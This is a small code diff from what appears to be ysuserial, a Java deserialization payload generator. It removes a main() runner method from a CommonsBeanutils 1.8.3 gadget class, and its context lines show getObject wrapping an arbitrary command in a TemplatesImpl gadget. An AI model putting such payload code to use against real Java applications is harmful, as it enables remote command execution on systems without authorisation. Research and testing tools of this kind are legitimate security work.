@@ -17,10 +17,6 @@ import static org.su18.ysuserial.payloads.handle.ClassFieldHandler.insertField;
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
 public class CommonsBeanutils1183NOCC implements ObjectPayload<Object> {
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsBeanutils1183NOCC.class, args);
-	}w
-
 	@Override
 	public Object getObject(String command) throws Exception {
 		final Object template = Gadgets.createTemplatesImpl(command);
